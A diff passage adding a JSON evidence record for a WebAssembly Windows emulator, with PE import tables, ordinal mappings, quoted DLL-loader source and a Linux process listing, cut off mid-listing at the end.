+        "iatVA": "0x40104c",
+        "name": "GetDeviceCaps",
+        "hint": 363
+      },
+      {
+        "dll": "GDI32.dll",
+        "iatRVA": "0x1050",
+        "iatVA": "0x401050",
+        "name": "DeleteObject",
+        "hint": 143
+      },
+      {
+        "dll": "GDI32.dll",
+        "iatRVA": "0x1054",
+        "iatVA": "0x401054",
+        "name": "BitBlt",
+        "hint": 18
+      },
+      {
+        "dll": "GDI32.dll",
+        "iatRVA": "0x1058",
+        "iatVA": "0x401058",
+        "name": "SelectObject",
+        "hint": 526
+      },
+      {
+        "dll": "GDI32.dll",
+        "iatRVA": "0x105c",
+        "iatVA": "0x40105c",
+        "name": "CreateCompatibleDC",
+        "hint": 45
+      },
+      {
+        "dll": "GDI32.dll",
+        "iatRVA": "0x1060",
+        "iatVA": "0x401060",
+        "name": "GetObjectA",
+        "hint": 405
+      },
+      {
+        "dll": "GDI32.dll",
+        "iatRVA": "0x1064",
+        "iatVA": "0x401064",
+        "name": "GetStockObject",
+        "hint": 421
+      },
+      {
+        "dll": "WINMM.dll",
+        "iatRVA": "0x1324",
+        "iatVA": "0x401324",
+        "name": "waveOutGetDevCapsA",
+        "hint": 184
+      },
+      {
+        "dll": "WINMM.dll",
+        "iatRVA": "0x1328",
+        "iatVA": "0x401328",
+        "name": "waveOutMessage",
+        "hint": 194
+      },
+      {
+        "dll": "WINMM.dll",
+        "iatRVA": "0x132c",
+        "iatVA": "0x40132c",
+        "name": "timeGetTime",
+        "hint": 163
+      },
+      {
+        "dll": "WINMM.dll",
+        "iatRVA": "0x1330",
+        "iatVA": "0x401330",
+        "name": "mmioOpenA",
+        "hint": 141
+      },
+      {
+        "dll": "WINMM.dll",
+        "iatRVA": "0x1334",
+        "iatVA": "0x401334",
+        "name": "mmioDescend",
+        "hint": 136
+      },
+      {
+        "dll": "WINMM.dll",
+        "iatRVA": "0x1338",
+        "iatVA": "0x401338",
+        "name": "mmioRead",
+        "hint": 143
+      },
+      {
+        "dll": "WINMM.dll",
+        "iatRVA": "0x133c",
+        "iatVA": "0x40133c",
+        "name": "mmioClose",
+        "hint": 134
+      },
+      {
+        "dll": "VERSION.dll",
+        "iatRVA": "0x1314",
+        "iatVA": "0x401314",
+        "name": "GetFileVersionInfoA",
+        "hint": 0
+      },
+      {
+        "dll": "VERSION.dll",
+        "iatRVA": "0x1318",
+        "iatVA": "0x401318",
+        "name": "GetFileVersionInfoSizeA",
+        "hint": 1
+      },
+      {
+        "dll": "VERSION.dll",
+        "iatRVA": "0x131c",
+        "iatVA": "0x40131c",
+        "name": "VerQueryValueA",
+        "hint": 10
+      },
+      {
+        "dll": "ole32.dll",
+        "iatRVA": "0x1344",
+        "iatVA": "0x401344",
+        "name": "CoInitialize",
+        "hint": 58
+      },
+      {
+        "dll": "ole32.dll",
+        "iatRVA": "0x1348",
+        "iatVA": "0x401348",
+        "name": "CoCreateInstance",
+        "hint": 16
+      },
+      {
+        "dll": "ole32.dll",
+        "iatRVA": "0x134c",
+        "iatVA": "0x40134c",
+        "name": "CoUninitialize",
+        "hint": 104
+      },
+      {
+        "dll": "ole32.dll",
+        "iatRVA": "0x1350",
+        "iatVA": "0x401350",
+        "name": "CLSIDFromString",
+        "hint": 8
+      },
+      {
+        "dll": "ole32.dll",
+        "iatRVA": "0x1354",
+        "iatVA": "0x401354",
+        "name": "CoTaskMemFree",
+        "hint": 100
+      },
+      {
+        "dll": "OLEAUT32.dll",
+        "iatRVA": "0x1248",
+        "iatVA": "0x401248",
+        "ordinal": 10
+      },
+      {
+        "dll": "OLEAUT32.dll",
+        "iatRVA": "0x124c",
+        "iatVA": "0x40124c",
+        "ordinal": 23
+      },
+      {
+        "dll": "OLEAUT32.dll",
+        "iatRVA": "0x1250",
+        "iatVA": "0x401250",
+        "ordinal": 6
+      },
+      {
+        "dll": "OLEAUT32.dll",
+        "iatRVA": "0x1254",
+        "iatVA": "0x401254",
+        "ordinal": 24
+      },
+      {
+        "dll": "OLEAUT32.dll",
+        "iatRVA": "0x1258",
+        "iatVA": "0x401258",
+        "ordinal": 2
+      },
+      {
+        "dll": "OLEAUT32.dll",
+        "iatRVA": "0x125c",
+        "iatVA": "0x40125c",
+        "ordinal": 9
+      },
+      {
+        "dll": "OLEAUT32.dll",
+        "iatRVA": "0x1260",
+        "iatVA": "0x401260",
+        "ordinal": 8
+      }
+    ],
+    "provenance": "Retained Pirates fixture, exact user-authorized SHA256 and size; same SHA256 documented in retained BGE note. No download. PE security directory zero: no Authenticode signature verification claimed."
+  },
+  "apiTable": {
+    "path": "/home/user/aoe3-canonical-c7fae5ac-staged/src/api_table.json",
+    "bytes": 723350,
+    "sha256": "562acd9c5870750d29cc88ed1ec12112c9da7164b8d9c3fe470a109842d39486"
+  },
+  "namedImports": 200,
+  "ordinalImports": 7,
+  "missing": [
+    {
+      "dll": "ADVAPI32.dll",
+      "iatRVA": "0x1028",
+      "iatVA": "0x401028",
+      "name": "QueryServiceConfigA",
+      "hint": 444
+    },
+    {
+      "dll": "ADVAPI32.dll",
+      "iatRVA": "0x1034",
+      "iatVA": "0x401034",
+      "name": "OpenServiceA",
+      "hint": 429
+    }
+  ],
+  "nativeAdvapiCandidates": [],
+  "ordinalMap": {
+    "2": "SysAllocString",
+    "6": "SysFreeString",
+    "8": "VariantInit",
+    "9": "VariantClear",
+    "10": "VariantCopy",
+    "23": "SafeArrayAccessData",
+    "24": "SafeArrayUnaccessData"
+  },
+  "sources": {
+    "src/08b-dll-loader.wat:;; OLEAUT32.": {
+      "path": "/home/user/aoe3-canonical-c7fae5ac-staged/src/08b-dll-loader.wat",
+      "sha256": "d801558c9904671344321285991fc1674ce5a8e2487db6390ff944fe718d4e4b",
+      "start": 1044,
+      "text": "1044:     ;; OLEAUT32. Kodak Imaging imports the VARIANT/BSTR set by ordinal only.\n1045:     (if (call $dll_name_match (local.get $dll_name_ga) \"oleaut32.dll\")\n1046:       (then\n1047:         (if (i32.eq (local.get $ordinal) (i32.const 2))  (then (return (call $lookup_api_id \"SysAllocString\"))))\n1048:         (if (i32.eq (local.get $ordinal) (i32.const 4))  (then (return (call $lookup_api_id \"SysAllocStringLen\"))))\n1049:         (if (i32.eq (local.get $ordinal) (i32.const 5))  (then (return (call $lookup_api_id \"SysReAllocStringLen\"))))\n1050:         (if (i32.eq (local.get $ordinal) (i32.const 6))  (then (return (call $lookup_api_id \"SysFreeString\"))))\n1051:         (if (i32.eq (local.get $ordinal) (i32.const 7))  (then (return (call $lookup_api_id \"SysStringLen\"))))\n1052:         (if (i32.eq (local.get $ordinal) (i32.const 8))  (then (return (call $lookup_api_id \"VariantInit\"))))\n1053:         (if (i32.eq (local.get $ordinal) (i32.const 9))  (then (return (call $lookup_api_id \"VariantClear\"))))\n1054:         (if (i32.eq (local.get $ordinal) (i32.const 10)) (then (return (call $lookup_api_id \"VariantCopy\"))))\n1055:         ;; DirectX 8.1 devenum.dll registers filters through these by ordinal.\n1056:         (if (i32.eq (local.get $ordinal) (i32.const 15)) (then (return (call $lookup_api_id \"SafeArrayCreate\"))))\n1057:         (if (i32.eq (local.get $ordinal) (i32.const 16)) (then (return (call $lookup_api_id \"SafeArrayDestroy\"))))\n1058:         (if (i32.eq (local.get $ordinal) (i32.const 23)) (then (return (call $lookup_api_id \"SafeArrayAccessData\"))))\n1059:         (if (i32.eq (local.get $ordinal) (i32.const 24)) (then (return (call $lookup_api_id \"SafeArrayUnaccessData\"))))\n1060:         (if (i32.eq (local.get $ordinal) (i32.const 64)) (then (return (call $lookup_api_id \"VarI4FromStr\"))))\n1061:         (if (i32.eq (local.get $ordinal) (i32.const 161)) (then (return (call $lookup_api_id \"LoadTypeLib\"))))\n1062:         (if (i32.eq (local.get $ordinal) (i32.const 163)) (then (return (call $lookup_api_id \"RegisterTypeLib\"))))\n1063:         ;; InstallShield 11 imports the binary-BSTR helpers by ordinal. Keep\n1064:         ;; these in the guest resolver as well as the host fallback so loaded\n1065:         ;; DLL imports cannot depend on which resolver path reached them.\n1066:         (if (i32.eq (local.get $ordinal) (i32.const 149)) (then (return (call $lookup_api_id \"SysStringByteLen\"))))\n1067:         (if (i32.eq (local.get $ordinal) (i32.const 150)) (then (return (call $lookup_api_id \"SysAllocStringByteLen\"))))\n1068:         (if (i32.eq (local.get $ordinal) (i32.const 420)) (then (return (call $lookup_api_id \"OleCreateFontIndirect\"))))\n1069:       ))\n1070:     (i32.const -1))\n1071: \n1072:   ;; Resolve one ordinal-only import. The WAT table above is consulted\n1073:   ;; first, so a DLL described there behaves the same whether the EXE or\n1074:   ;; another DLL imports it \u2014 the two loaders previously each had their own\n1075:   ;; answer, and a name present in one was missing from the other. The host\n1076:   ;; map still covers the DLLs whose ordinals have not moved into WAT.\n1077:   ;; $dll_name_ga is a guest address (what $dll_name_match reads through);\n1078:   ;; $dll_name_wa is the same string as a linear-memory address, which is\n1079:   ;; what the host import expects.\n1080:   (func $resolve_import_ordinal (param $dll_name_ga i32) (param $dll_name_wa i32)\n1081:                                 (param $ordinal i32) (result i32)\n1082:     (local $id i32)\n1083:     (local.set $id (call $system_ordinal_api_id\n"
+    },
+    "src/08b-dll-loader.wat:;; Process a loaded DLL": {
+      "path": "/home/user/aoe3-canonical-c7fae5ac-staged/src/08b-dll-loader.wat",
+      "sha256": "d801558c9904671344321285991fc1674ce5a8e2487db6390ff944fe718d4e4b",
+      "start": 1088,
+      "text": "1088:   ;; Process a loaded DLL's imports \u2014 create thunks for system DLLs,\n1089:   ;; resolve against other loaded DLLs if found.\n1090:   (func $process_dll_imports (param $load_addr i32) (param $import_rva i32)\n1091:     (local $data_addr i32)\n1092:     (local $desc_ptr i32) (local $ilt_rva i32) (local $iat_rva i32)\n1093:     (local $ilt_ptr i32) (local $iat_ptr i32) (local $entry i32) (local $thunk_addr i32)\n1094:     (local $dll_name_rva i32) (local $dll_name_ptr i32)\n1095:     (local $resolved_dll i32) (local $resolved_addr i32) (local $api_id i32) (local $hint_name_wa i32)\n1096:     (local.set $desc_ptr (call $g2w (i32.add (local.get $load_addr) (local.get $import_rva))))\n1097:     (block $id (loop $dl\n1098:       (local.set $ilt_rva (i32.load (local.get $desc_ptr)))\n1099:       (local.set $iat_rva (i32.load (i32.add (local.get $desc_ptr) (i32.const 16))))\n1100:       ;; OriginalFirstThunk is optional. As in the main PE loader, a stripped\n1101:       ;; image keeps its lookup entries in FirstThunk until we overwrite them.\n1102:       ;; FirstThunk is required for a live descriptor, so use it to recognize\n1103:       ;; the terminator and as the lookup-table fallback.\n1104:       (br_if $id (i32.eqz (local.get $iat_rva)))\n1105:       (if (i32.eqz (local.get $ilt_rva))\n1106:         (then (local.set $ilt_rva (local.get $iat_rva))))\n1107:       ;; Get imported DLL name\n1108:       (local.set $dll_name_rva (i32.load (i32.add (local.get $desc_ptr) (i32.const 12))))\n1109:       (local.set $dll_name_ptr (i32.add (local.get $load_addr) (local.get $dll_name_rva)))\n1110:       ;; Check if this DLL is loaded \u2014 search DLL_TABLE\n1111:       (call $dll_load_lock_begin)\n1112:       (local.set $resolved_dll (call $find_loaded_dll (local.get $dll_name_ptr)))\n1113:       (if (i32.ge_s (local.get $resolved_dll) (i32.const 0))\n1114:         (then\n1115:           (if (i32.eqz (call $dll_bind_dependency_locked\n1116:                 (call $dll_index_from_module (local.get $load_addr)) (local.get $resolved_dll)))\n1117:             (then (local.set $resolved_dll (i32.const -1))))))\n1118:       (call $lock_release (global.get $DLL_LOAD_LOCK))\n1119:       (local.set $ilt_ptr (call $g2w (i32.add (local.get $load_addr) (local.get $ilt_rva))))\n1120:       (local.set $iat_ptr (call $g2w (i32.add (local.get $load_addr) (local.get $iat_rva))))\n1121:       (block $fd (loop $fl\n1122:         (local.set $entry (i32.load (local.get $ilt_ptr)))\n1123:         (br_if $fd (i32.eqz (local.get $entry)))\n1124:         (if (i32.ge_s (local.get $resolved_dll) (i32.const 0))\n1125:           (then\n1126:             ;; Resolve against loaded DLL\n1127:             (if (i32.and (local.get $entry) (i32.const 0x80000000))\n1128:               (then\n1129:                 ;; Ordinal import\n1130:                 (local.set $resolved_addr (call $resolve_ordinal (local.get $resolved_dll)\n1131:                   (i32.and (local.get $entry) (i32.const 0xFFFF)))))\n1132:               (else\n1133:                 ;; Name import \u2014 get name from hint/name table\n1134:                 (local.set $resolved_addr (call $resolve_name_export (local.get $resolved_dll)\n1135:                   (call $g2w (i32.add (local.get $load_addr) (i32.add (local.get $entry) (i32.const 2))))))))\n1136:             (i32.store (local.get $iat_ptr) (local.get $resolved_addr)))\n1137:           (else\n1138:             ;; System DLL \u2014 create thunk. LoadLibrary can run on any guest\n1139:             ;; thread, so the index comes from the process-wide cursor rather\n1140:             ;; than this instance's count (see $thunk_reserve).\n1141:             (global.set $num_thunks (call $thunk_reserve))\n1142:             (local.set $thunk_addr (i32.add\n1143:               (i32.sub (i32.add (global.get $THUNK_BASE) (i32.mul (global.get $num_thunks) (i32.const 8)))\n1144:                        (global.get $GUEST_BASE))\n1145:               (global.get $image_base)))\n1146:             (i32.store (local.get $iat_ptr) (local.get $thunk_addr))\n1147:             (if (i32.eqz (i32.and (local.get $entry) (i32.const 0x80000000)))\n1148:               (then\n1149:                 (local.set $hint_name_wa\n1150:                   (call $g2w (i32.add (local.get $load_addr) (local.get $entry))))\n1151:                 (local.set $api_id (call $import_hint_override_api_id\n1152:                   (local.get $dll_name_ptr)\n1153:                   (local.get $hint_name_wa)))\n1154:                 (if (i32.ne (local.get $api_id) (i32.const -1))\n1155:                   (then\n1156:                     (i32.store\n1157:                       (i32.add (global.get $THUNK_BASE)\n1158:                         (i32.mul (global.get $num_thunks) (i32.const 8)))\n1159:                       (i32.or (i32.const 0x80000000)\n1160:                         (i32.load16_u (local.get $hint_name_wa))))\n1161:                     (i32.store\n1162:                       (i32.add\n1163:                         (i32.add (global.get $THUNK_BASE)\n1164:                           (i32.mul (global.get $num_thunks) (i32.const 8)))\n1165:                         (i32.const 4))\n1166:                       (local.get $api_id)))\n1167:                   (else\n1168:                     ;; Name import: store name RVA relative to guest base.\n1169:                     ;; The name is at load_addr + entry, but thunk expects RVA\n1170:                     ;; from image_base.\n1171:                     (i32.store\n1172:                       (i32.add (global.get $THUNK_BASE)\n1173:                         (i32.mul (global.get $num_thunks) (i32.const 8)))\n1174:                       (i32.sub (i32.add (local.get $load_addr) (local.get $entry))\n1175:                         (global.get $image_base)))\n1176:                     (i32.store\n1177:                       (i32.add\n1178:                         (i32.add (global.get $THUNK_BASE)\n1179:                           (i32.mul (global.get $num_thunks) (i32.const 8)))\n1180:                         (i32.const 4))\n1181:                       (call $lookup_api_id\n1182:                         (call $g2w\n1183:                           (i32.add (local.get $load_addr)\n1184:                             (i32.add (local.get $entry) (i32.const 2)))))))))\n1185:               (else\n1186:                 ;; A DLL import needs the same WAT-first, host-fallback ordinal\n1187:                 ;; resolver as the main executable.  Calling only the static\n1188:                 ;; WAT table here made host-mapped system exports (notably the\n1189:                 ;; authentic DPLAYX ordinal set) turn into ORD diagnostics\n1190:                 ;; when imported by a loaded DLL, even though the identical\n1191:                 ;; import from an EXE resolved correctly.\n1192:                 (local.set $api_id (call $resolve_import_ordinal\n1193:                   (local.get $dll_name_ptr)\n1194:                   (call $g2w (local.get $dll_name_ptr))\n1195:                   (i32.and (local.get $entry) (i32.const 0xFFFF))))\n1196:                 (if (i32.ne (local.get $api_id) (i32.const -1))\n1197:                   (then\n1198:                     (i32.store (i32.add (global.get $THUNK_BASE) (i32.mul (global.get $num_thunks) (i32.const 8)))\n1199:                       (i32.or (i32.const 0x80000000) (i32.and (local.get $entry) (i32.const 0xFFFF))))\n1200:                     (i32.store (i32.add (i32.add (global.get $THUNK_BASE) (i32.mul (global.get $num_thunks) (i32.const 8))) (i32.const 4))\n1201:                       (local.get $api_id)))\n1202:                   (else\n1203:                     ;; Unknown ordinal: retain a clear diagnostic instead of\n1204:                     ;; treating the raw ordinal as an API-table index.\n1205:                     (i32.store (i32.add (global.get $THUNK_BASE) (i32.mul (global.get $num_thunks) (i32.const 8)))\n1206:                       (i32.const 0x4F524400)) ;; \"ORD\\0\" marker\n1207:                     (i32.store (i32.add (i32.add (global.get $THUNK_BASE) (i32.mul (global.get $num_thunks) (i32.const 8))) (i32.const 4))\n"
+    },
+    "lib/dll-loader.js:const WINDOWS_SYSTEM_DLLS": {
+      "path": "/home/user/aoe3-canonical-c7fae5ac-staged/lib/dll-loader.js",
+      "sha256": "8dde0a569d1c8a10b4c12119ac5fde37e4aeb45629290fd1feb24fb6291a6145",
+      "start": 1744,
+      "text": "1744: const WINDOWS_SYSTEM_DLLS = new Set([\n1745:   'advapi32', 'avicap32', 'avifil32', 'comctl32', 'comdlg32', 'crtdll',\n1746:   'd3dim', 'd3drm', 'd3dxof', 'dciman32', 'ddraw', 'dinput', 'dplay', 'dplayx',\n1747:   'dsound', 'gdi32', 'glu32', 'imagehlp', 'imm32', 'kernel32', 'lz32',\n1748:   'mapi32', 'mfc42', 'mpr', 'msacm32', 'msimg32', 'msvcrt', 'msvfw32',\n1749:   'netapi32', 'ole32', 'oleaut32', 'olecli32', 'oledlg', 'olepro32',\n1750:   'olesvr32', 'opengl32', 'rasapi32', 'rpcrt4', 'setupapi', 'shell32',\n1751:   'shlwapi', 'svrapi', 'tapi32', 'url', 'urlmon', 'user32', 'version',\n1752:   'wininet', 'winmm', 'winspool.drv', 'wintrust', 'ws2_32', 'wsock32',\n1753: ]);\n1754: function isWindowsSystemDll(name) {\n1755:   const key = String(name).toLowerCase();\n1756:   return WINDOWS_SYSTEM_DLLS.has(key.endsWith('.dll') ? key.slice(0, -4) : key);\n1757: }\n1758: \n1759: /**\n1760:  * The imported DLLs that Windows could not resolve, so LoadLibrary of this\n1761:  * image fails with ERROR_MOD_NOT_FOUND. A dependency is satisfied when its\n1762:  * file exists, or when it is a DLL the emulator answers for -- recognised by\n1763:  * at least one of the names imported from it being a known API. An\n1764:  * ordinal-only dependency cannot be checked by name and is assumed present.\n1765:  * Monster Truck Madness 2 probes Trirend.dll, whose redline.dll (the Rendition\n1766:  * Verite runtime) is not installed; Windows refuses that load and the game\n1767:  * drops the renderer, where binding fail-fast stubs crashed on VL_OpenVerite.\n1768:  * @param {Uint8Array} bytes\n1769:  * @param {(name: string) => boolean} apiKnown\n1770:  * @param {(dll: string) => boolean|Promise<boolean>} dllExists\n1771:  * @returns {Promise<string[]>} lowercase DLL names\n1772:  */\n1773: async function missingImportDependencies(bytes, apiKnown, dllExists) {\n1774:   const missing = [];\n1775:   for (const dep of importsByDll(bytes)) {\n1776:     if (!dep.names.length) continue;\n1777:     if (isWindowsSystemDll(dep.dll)) continue;\n1778:     if (dep.names.some(n => apiKnown(n))) continue;\n1779:     if (await dllExists(dep.dll)) continue;\n1780:     missing.push(dep.dll);\n1781:   }\n1782:   return missing;\n1783: }\n"
+    },
+    "src/09a0-handlers-base.wat:(func $handle_OpenSCManagerA": {
+      "path": "/home/user/aoe3-canonical-c7fae5ac-staged/src/09a0-handlers-base.wat",
+      "sha256": "65b108f43813c4a9ac1eac9ccffec132ca34dabe6b35c570ab28a50dc4bc758d",
+      "start": 3498,
+      "text": "3498:   (func $handle_OpenSCManagerA (param $arg0 i32) (param $arg1 i32) (param $arg2 i32) (param $arg3 i32) (param $arg4 i32) (param $name_ptr i32)\n3499:     (global.set $last_error (i32.const 120)) ;; ERROR_CALL_NOT_IMPLEMENTED\n3500:     (i32.store offset=0 (global.get $reg_base) (i32.const 0))\n3501:     (i32.store offset=16 (global.get $reg_base) (i32.add (i32.load offset=16 (global.get $reg_base)) (i32.const 16)))\n3502:   )\n3503: \n3504:   (func $handle_CloseServiceHandle (param $arg0 i32) (param $arg1 i32) (param $arg2 i32) (param $arg3 i32) (param $arg4 i32) (param $name_ptr i32)\n3505:     ;; No service-control-manager handle can be produced by this Win98\n3506:     ;; personality, so accepting a fabricated nonzero value would be a false\n3507:     ;; success. Match the documented invalid-handle failure contract.\n3508:     (global.set $last_error (i32.const 6)) ;; ERROR_INVALID_HANDLE\n3509:     (i32.store offset=0 (global.get $reg_base) (i32.const 0))\n3510:     (i32.store offset=16 (global.get $reg_base) (i32.add (i32.load offset=16 (global.get $reg_base)) (i32.const 8)))\n3511:   )\n3512: \n3513:   ;; DosDateTimeToFileTime(wFatDate, wFatTime, lpFileTime). Convert the FAT\n3514:   ;; local calendar fields to 100ns ticks since 1601-01-01. Timezone\n3515:   ;; conversion, when requested, is handled separately by\n3516:   ;; LocalFileTimeToFileTime.\n3517:   (func $handle_DosDateTimeToFileTime (param $arg0 i32) (param $arg1 i32) (param $arg2 i32) (param $arg3 i32) (param $arg4 i32) (param $name_ptr i32)\n3518:     (local $year i32) (local $month i32) (local $day i32)\n3519:     (local $hour i32) (local $minute i32) (local $second i32)\n3520:     (local $leap i32) (local $max_day i32) (local $month_days i32)\n3521:     (local $year_minus_one i32) (local $days i32) (local $ticks i64)\n3522:     (local.set $year (i32.add (i32.const 1980)\n3523:       (i32.and (i32.shr_u (local.get $arg0) (i32.const 9)) (i32.const 0x7f))))\n3524:     (local.set $month (i32.and (i32.shr_u (local.get $arg0) (i32.const 5)) (i32.const 0x0f)))\n3525:     (local.set $day (i32.and (local.get $arg0) (i32.const 0x1f)))\n3526:     (local.set $hour (i32.and (i32.shr_u (local.get $arg1) (i32.const 11)) (i32.const 0x1f)))\n3527:     (local.set $minute (i32.and (i32.shr_u (local.get $arg1) (i32.const 5)) (i32.const 0x3f)))\n3528:     (local.set $second (i32.mul (i32.and (local.get $arg1) (i32.const 0x1f)) (i32.const 2)))\n3529: \n3530:     (local.set $leap\n3531:       (i32.or\n3532:         (i32.eq (i32.rem_u (local.get $year) (i32.const 400)) (i32.const 0))\n3533:         (i32.and\n3534:           (i32.eq (i32.rem_u (local.get $year) (i32.const 4)) (i32.const 0))\n3535:           (i32.ne (i32.rem_u (local.get $year) (i32.const 100)) (i32.const 0)))))\n3536:     (local.set $max_day (i32.const 31))\n3537:     (if (i32.eq (local.get $month) (i32.const 2))\n"
+    },
+    "lib/apps.js:      pirates_2004:": {
+      "path": "/home/user/aoe3-canonical-c7fae5ac-staged/lib/apps.js",
+      "sha256": "5a438ebd6c312a99f0f638d3cc57336885d4daa707b9bb03d227de008cafbd54",
+      "start": 4980,
+      "text": "4980:       pirates_2004: {\n4981:         d3d9Programmable: true,\n4982:         bigMemory: true,\n4983:         exe: 'test/binaries/candidates/pirates-2004/digital/app/Pirates!.exe',\n4984:         dlls: [\n4985:           'test/binaries/candidates/pirates-2004/digital/app/msvcr71.dll',\n4986:           'test/binaries/candidates/pirates-2004/digital/app/msvcp71.dll',\n4987:         ],\n4988:         files: [{\n4989:           url: 'test/binaries/candidates/pirates-2004/dx9/dxdiagn.dll',\n4990:           vfsPath: 'c:\\\\windows\\\\system\\\\dxdiagn.dll',\n4991:         }, {\n4992:           url: 'test/binaries/candidates/pirates-2004/local-config.ini',\n4993:           vfsPath: 'c:\\\\My Documents\\\\My Games\\\\c:\\\\Config.ini',\n4994:         }],\n4995:         startupRegistry: [{\n4996:           keyPath: 'HKCR\\\\CLSID\\\\{A65B8071-3BFE-4213-9A5B-491DA4461CA7}\\\\InprocServer32',\n4997:           valueName: '', type: 1, data: 'c:\\\\windows\\\\system\\\\dxdiagn.dll',\n4998:         }, {\n4999:           keyPath: 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\DirectX',\n5000:           valueName: 'Version', type: 1, data: '4.09.00.0904',\n5001:         }],\n5002:         localFileManifest: 'test/binaries/candidates/pirates-2004/.wine-assembly-browser.json',\n5003:         requiredFiles: true,\n5004:         preExtractIcon: false,\n5005:       },\n5006:       // Morrowind GOTY retail. Nothing here is ours to publish: the tree under\n5007:       // morrowindRoot is written from the visitor's own ISO by\n5008:       // tools/prepare-morrowind.js and stays gitignored, and the deploy tool\n5009:       // refuses that directory outright. See docs/re-notes/morrowind.md.\n5010:       morrowind: {\n5011:         exe: morrowindRoot + 'installed/Morrowind.exe',\n5012:         dlls: [morrowindRoot + 'installed/binkw32.dll'],\n5013:         files: [],\n5014:         localFileManifest: morrowindRoot + '.wine-assembly-browser.json',\n5015:         requiredFiles: true,\n5016:         preExtractIcon: false,\n5017:         fileConcurrency: 12,\n5018:         // At 512 MB the sparse arena runs out while DirectShow builds the\n5019:         // title-music graph and the game quits with \"Music Error\".\n"
+    }
+  },
+  "registry": {
+    "path": "/home/user/aoe3-original-oct22/installed-audit/launch-registry.json",
+    "bytes": 15888,
+    "sha256": "69fd648e03a5d4f1f25c41dcdbb2f976f813ca36a1dbdd3d9db5d05280f45cfe"
+  },
+  "originalRunner": {
+    "path": "/home/user/aoe3-canonical-c7fae5ac-evidence/guest/original-run-relocated.js",
+    "bytes": 686678,
+    "sha256": "a4838039936d5b20fd55738661cb0dc6aee27739c2f9cfbff36da64641db50c3"
+  },
+  "module": {
+    "path": "/home/user/aoe3-canonical-c7fae5ac-staged/build/wine-assembly.wasm",
+    "bytes": 1879618,
+    "sha256": "6ac6b43475d9217ffffa98aaec3f57243de47c78c0647dcd31abef404e008678"
+  },
+  "portsConnectEx": {
+    "8123": 111,
+    "8124": 111
+  },
+  "processes": "    PID COMMAND\n      1 /sbin/init\n      2 [kthreadd]\n      3 [pool_workqueue_release]\n      4 [kworker/R-rcu_gp]\n      5 [kworker/R-sync_wq]\n      6 [kworker/R-kvfree_rcu_reclaim]\n      7 [kworker/R-slub_flushwq]\n      8 [kworker/R-netns]\n     10 [kworker/0:0H-kblockd]\n     13 [kworker/R-mm_percpu_wq]\n     14 [ksoftirqd/0]\n     15 [pr/ttyS0]\n     16 [rcu_preempt]\n     17 [rcu_exp_par_gp_kthread_worker/0]\n     18 [rcu_exp_gp_kthread_worker]\n     19 [migration/0]\n     20 [kprobe-optimizer]\n     21 [idle_inject/0]\n     22 [cpuhp/0]\n     23 [cpuhp/1]\n     24 [idle_inject/1]\n     25 [migration/1]\n     26 [ksoftirqd/1]\n     28 [kworker/1:0H-kblockd]\n     29 [cpuhp/2]\n     30 [idle_inject/2]\n     31 [migration/2]\n     32 [ksoftirqd/2]\n     34 [kworker/2:0H-kblockd]\n     35 [cpuhp/3]\n     36 [idle_inject/3]\n     37 [migration/3]\n     38 [ksoftirqd/3]\n     40 [kworker/3:0H-kblockd]\n     41 [kdevtmpfs]\n     42 [kworker/R-inet_frag_wq]\n     43 [rcu_tasks_kthread]\n     44 [rcu_tasks_rude_kthread]\n     45 [kauditd]\n     46 [khungtaskd]\n     47 [oom_reaper]\n     49 [kworker/R-writeback]\n     52 [kcompactd0]\n     53 [ksmd]\n     54 [khugepaged]\n     55 [kworker/R-kblockd]\n     56 [kworker/R-blkcg_punt_bio]\n     57 [kworker/R-kintegrityd]\n     60 [kworker/R-tpm_dev_wq]\n     61 [kworker/R-ata_sff]\n     62 [kworker/R-md_bitmap]\n     63 [kworker/R-md_llbitmap_io]\n     64 [kworker/R-md_llbitmap_unplug]\n     65 [kworker/R-edac-poller]\n     66 [kworker/R-devfreq_wq]\n     67 [watchdogd]\n     68 [kworker/R-quota_events_unbound]\n     69 [kswapd0]\n     70 [ecryptfs-kthread]\n     71 [kworker/R-kthrotld]\n     72 [irq/48-ACPI:Ged]\n     73 [kworker/R-acpi_thermal_pm]\n     74 [kworker/R-mld]\n     75 [kworker/R-ipv6_addrconf]\n     76 [kworker/R-kstrp]\n     78 [kworker/u17:0]\n     89 [kworker/R-charger_manager]\n    148 [hwrng]\n    189 [kworker/R-raid5wq]\n    227 [kworker/2:1H-kblockd]\n    229 [jbd2/vda1-8]\n    230 [kworker/R-ext4-rsv-conversion]\n    284 [kworker/3:1H-kblockd]\n    304 /usr/lib/systemd/systemd-journald\n    332 [kworker/1:1H-kblockd]\n    356 [kworker/R-kmpathd]\n    357 [kworker/R-kmpath_handlerd]\n    358 /sbin/multipathd -d -s\n    361 [kworker/0:1H-kblockd]\n    387 /usr/lib/systemd/systemd-udevd\n    388 [psimon]\n    551 /usr/lib/systemd/systemd-timesyncd\n    741 /usr/lib/systemd/systemd-networkd\n    744 [kworker/R-cfg80211]\n    849 /usr/libexec/accounts-daemon\n    852 avahi-daemon: running [box-node-1a8d77f5dbfd4679.local]\n    853 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\n    862 /usr/libexec/gnome-remote-desktop-daemon --system\n    889 /usr/lib/polkit-1/polkitd --no-debug\n    898 /usr/libexec/power-profiles-daemon\n    919 /usr/libexec/switcheroo-control\n    922 /usr/lib/systemd/systemd-logind\n    923 /usr/libexec/udisks2/udisksd\n    966 avahi-daemon: chroot helper\n    967 /usr/sbin/NetworkManager --no-daemon\n    977 /usr/sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev\n   1020 /usr/sbin/rsyslogd -n -iNONE\n   1054 /usr/sbin/ModemManager\n   1209 /usr/sbin/cupsd -l\n   1210 /usr/bin/epmd -systemd\n   1218 /usr/bin/containerd\n   1224 /usr/sbin/cron -f -P\n   1226 /usr/sbin/atd -f\n   1230 /usr/sbin/cups-browsed\n   1238 /sbin/agetty -o -p -- \\u --keep-baud 115200,57600,38400,9600 - vt220\n   1251 /sbin/agetty -o -p -- \\u --noclear - linux\n   1264 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock\n   1443 /usr/lib/systemd/systemd --user\n   1444 (sd-pam)\n   1500 /usr/bin/pipewire\n   1501 /usr/bin/pipewire -c filter-chain.conf\n   1502 /usr/bin/wireplumber\n   1506 /usr/bin/pipewire-pulse\n   1524 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\n   1575 /usr/libexec/rtkit-daemon\n   2019 /usr/libexec/gvfsd\n   2025 